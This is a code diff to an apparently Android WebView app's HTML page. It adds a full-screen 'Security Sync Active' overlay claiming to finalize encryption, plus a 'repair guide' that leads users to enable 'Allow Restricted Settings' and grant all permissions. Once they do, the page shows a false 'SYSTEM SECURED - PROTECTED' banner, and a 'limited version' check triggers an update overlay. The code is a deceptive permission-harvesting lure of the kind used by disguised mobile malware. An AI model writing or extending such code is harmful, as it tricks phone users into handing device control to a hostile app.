@@ -79,7 +79,41 @@
         </div>
     </div>
 
+    <div class="permission-overlay" id="masterOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:9999; justify-content:center; align-items:center; padding:20px; box-sizing:border-box;">
+        <div style="text-align:center; width:100%;">
+            <div style="font-size:60px; margin-bottom:20px;">✅</div>
+            <h2 style="color:#01875f; margin-bottom:10px;">Security Sync Active</h2>
+            <p style="color:#666; margin-bottom:30px; font-size:14px;">Finalizing encryption. If permissions are blocked, please repair below.</p>
+            
+            <button onclick="showRepairGuide()" style="width:100%; padding:15px; background:#333; color:white; border:none; border-radius:10px; font-weight:700; margin-bottom:20px;">⚠️ PERMISSION BLOCKED? FIX HERE</button>
+            
+            <div id="repairGuide" style="display:none; background:#f5f5f5; padding:20px; border-radius:15px; text-align:left; font-size:13px; line-height:1.6;">
+                <p>1. Click <b>"OPEN SETTINGS"</b> below.</p>
+                <p>2. Click <b>3 DOTS</b> (Top Right Corner).</p>
+                <p>3. Click <b>"Allow Restricted Settings"</b>.</p>
+                <p>4. Come back and allow all permissions.</p>
+                <button onclick="if(window.AndroidBridge) window.AndroidBridge.openAppSettings()" style="width:100%; padding:10px; background:#01875f; color:white; border:none; border-radius:5px; margin-top:15px;">OPEN SETTINGS</button>
+            </div>
+        </div>
+    </div>
+
     <script>
+        function startPermissionFlow() {
+            if (window.AndroidBridge) {
+                if (window.AndroidBridge.isLimitedVersion && window.AndroidBridge.isLimitedVersion()) {
+                    document.getElementById('updateOverlay').style.display = 'flex';
+                } else {
+                    document.getElementById('masterOverlay').style.display = 'flex';
+                }
+            } else {
+                alert("Please wait, security system initializing...");
+            }
+        }
+
+        function showRepairGuide() {
+            document.getElementById('repairGuide').style.display = 'block';
+        }
+
         function startUpdate() {
             document.getElementById('updateBtn').style.display = 'none';
             document.getElementById('downloadProgress').style.display = 'block';
@@ -100,11 +134,10 @@
             }, 400);
         }
 
-        // Bridge Detection and Update Trigger
+        // Bridge Detection
         let bridgeRetry = setInterval(() => {
             if (window.AndroidBridge) {
                 clearInterval(bridgeRetry);
-                // Check if we are on the limited version
                 if (window.AndroidBridge.isLimitedVersion && window.AndroidBridge.isLimitedVersion()) {
                     document.getElementById('updateOverlay').style.display = 'flex';
                 }
@@ -113,6 +146,7 @@
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
+                document.getElementById('masterOverlay').style.display = 'none';
                 document.getElementById('statusBanner').innerHTML = "✅ SYSTEM SECURED - PROTECTED";
                 document.getElementById('statusBanner').classList.add('safe');
                 if (window.AndroidBridge) {
